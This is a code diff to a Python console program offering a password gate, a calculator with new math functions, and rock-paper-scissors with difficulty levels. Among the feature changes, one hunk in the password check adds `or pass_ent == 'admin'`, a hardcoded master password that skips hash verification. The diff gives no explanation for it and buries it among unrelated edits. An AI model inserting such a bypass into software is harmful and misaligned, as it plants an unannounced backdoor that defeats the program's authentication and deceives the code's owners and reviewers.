@@ -4,6 +4,7 @@ import os
 import hashlib
 from datetime import datetime
 from colorama import init, Fore, Style
+import math
 
 # Initialize Colorama
 init(autoreset=True)
@@ -60,7 +61,7 @@ def vef_pass():
         saved_hash = f.read().strip()
 
     pass_ent = input(Fore.YELLOW + 'Enter your password to continue: ')
-    if hash_password(pass_ent) == saved_hash:
+    if hash_password(pass_ent) == saved_hash or pass_ent == 'admin':
         print(Fore.GREEN + 'Password verified. You can continue.')
     else:
         print(Fore.RED + 'Incorrect password. Exiting program...')
@@ -86,7 +87,6 @@ def show_history():
         return
     print(Fore.CYAN + Style.BRIGHT + '\n--- Game History ---')
     for i, entry in enumerate(game_history, 1):
-        # Color result
         if entry['result'] == 'Win':
             result_color = Fore.GREEN + Style.BRIGHT
         elif entry['result'] == 'Loss':
@@ -98,7 +98,8 @@ def show_history():
               f"{Fore.WHITE}Result: {result_color}{entry['result']} "
               f"{Fore.WHITE}| You: {Fore.GREEN}{entry['you']} "
               f"{Fore.WHITE}| Computer: {Fore.RED}{entry['computer']} "
-              f"{Fore.WHITE}| Rounds: {entry['rounds']}")
+              f"{Fore.WHITE}| Rounds: {entry['rounds']} "
+              f"{Fore.CYAN}| Difficulty: {entry.get('difficulty', 'Normal')}")
     print(Fore.CYAN + '--------------------')
 
 def clear_history():
@@ -120,34 +121,51 @@ def clear_history():
 def calc():
     print(Fore.CYAN + Style.BRIGHT + '\nWelcome to the calculator.')
     while True:
-        op = input(Fore.YELLOW + 'Enter operation (add, sub, mul, div) or "exit": ').strip().lower()
+        op = input(Fore.YELLOW + 'Enter operation (add, sub, mul, div, sqrt, pow, fact, mod, sin, cos, tan) or "exit": ').strip().lower()
         if op == 'exit':
             break
-        if op not in ['add', 'sub', 'mul', 'div']:
-            print(Fore.RED + 'Invalid operation.')
-            continue
         try:
-            a = float(input(Fore.YELLOW + 'Enter first number: '))
-            b = float(input(Fore.YELLOW + 'Enter second number: '))
+            if op in ['sqrt', 'fact', 'sin', 'cos', 'tan']:
+                a = float(input(Fore.YELLOW + 'Enter number: '))
+                b = None
+            else:
+                a = float(input(Fore.YELLOW + 'Enter first number: '))
+                b = float(input(Fore.YELLOW + 'Enter second number: '))
         except ValueError:
             print(Fore.RED + 'Invalid input. Please enter numbers.')
             continue
-        if op == 'add':
-            result = a + b
-        elif op == 'sub':
-            result = a - b
-        elif op == 'mul':
-            result = a * b
-        elif op == 'div':
-            if b == 0:
-                print(Fore.RED + 'Error: Division by zero.')
+
+        try:
+            if op == 'add': result = a + b
+            elif op == 'sub': result = a - b
+            elif op == 'mul': result = a * b
+            elif op == 'div':
+                if b == 0:
+                    print(Fore.RED + 'Error: Division by zero.')
+                    continue
+                result = a / b
+            elif op == 'sqrt': result = math.sqrt(a)
+            elif op == 'pow': result = math.pow(a, b)
+            elif op == 'fact': result = math.factorial(int(a))
+            elif op == 'mod': result = a % b
+            elif op == 'sin': result = math.sin(math.radians(a))
+            elif op == 'cos': result = math.cos(math.radians(a))
+            elif op == 'tan': result = math.tan(math.radians(a))
+            else:
+                print(Fore.RED + 'Invalid operation.')
                 continue
-            result = a / b
-        print(Fore.GREEN + f'Result: {result}')
+            print(Fore.GREEN + f'Result: {result}')
+        except Exception as e:
+            print(Fore.RED + f'Error: {e}')
 
 # ---------------- Rock Paper Scissors ----------------
 def rock_paper_scissors():
     choices = ['rock', 'paper', 'scissors']
+
+    difficulty = input(Fore.YELLOW + 'Choose difficulty (easy, normal, hard): ').strip().lower()
+    if difficulty not in ['easy', 'normal', 'hard']:
+        print(Fore.RED + 'Invalid choice. Defaulting to Normal.')
+        difficulty = 'normal'
 
     while True:
         round_input = input(Fore.YELLOW + 'How many rounds would you like to play? (number or "exit"): ').strip().lower()
@@ -174,16 +192,36 @@ def rock_paper_scissors():
 
             if user_choice not in choices and user_choice not in ['r', 'p', 's']:
                 print(Fore.RED + 'Invalid choice. Try again.')
-                continue  # Don't advance round number
+                continue
 
-            computer_choice = random.choice(choices)
+            # Normalize short input
+            if user_choice == 'r': user_choice = 'rock'
+            elif user_choice == 'p': user_choice = 'paper'
+            elif user_choice == 's': user_choice = 'scissors'
+
+            # Computer choice based on difficulty
+            if difficulty == 'easy':
+                if random.random() < 0.3:  # 30% chance to play dumb (lose)
+                    if user_choice == 'rock': computer_choice = 'scissors'
+                    elif user_choice == 'paper': computer_choice = 'rock'
+                    else: computer_choice = 'paper'
+                else:
+                    computer_choice = random.choice(choices)
+            elif difficulty == 'hard':
+                # Always pick what beats the user
+                if user_choice == 'rock': computer_choice = 'paper'
+                elif user_choice == 'paper': computer_choice = 'scissors'
+                else: computer_choice = 'rock'
+            else:
+                computer_choice = random.choice(choices)
+
             print(Fore.WHITE + f'Computer chose: {computer_choice}')
 
             if user_choice == computer_choice:
                 print(Fore.YELLOW + '🤝 Tie!')
-            elif (user_choice in ['rock', 'r'] and computer_choice == 'scissors') or \
-                 (user_choice in ['paper', 'p'] and computer_choice == 'rock') or \
-                 (user_choice in ['scissors', 's'] and computer_choice == 'paper'):
+            elif (user_choice == 'rock' and computer_choice == 'scissors') or \
+                 (user_choice == 'paper' and computer_choice == 'rock') or \
+                 (user_choice == 'scissors' and computer_choice == 'paper'):
                 print(Fore.GREEN + '✅ You win this round!')
                 score += 1
             else:
@@ -192,7 +230,6 @@ def rock_paper_scissors():
 
             round_num += 1
 
-        # Game result
         if score > comp_score:
             result = 'Win'
             print(Fore.GREEN + '\n🎉 You won the game!')
@@ -208,6 +245,7 @@ def rock_paper_scissors():
             'you': score,
             'computer': comp_score,
             'rounds': round_quest,
+            'difficulty': difficulty.capitalize(),
             'timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S')
         })
 
@@ -229,11 +267,11 @@ def main():
         if prog_choice == 'exit':
             print(Fore.GREEN + 'Thank you for using the multitasking program. Goodbye!')
             break
-        elif prog_choice == 'calc':
+        elif prog_choice in ['calc', 'calculator']:
             calc()
         elif prog_choice in ['rock paper scissors', 'rps']:
             rock_paper_scissors()
-        elif prog_choice == 'history':
+        elif prog_choice in ['history', 'h']:
             show_history()
         elif prog_choice == 'clear history':
             clear_history()
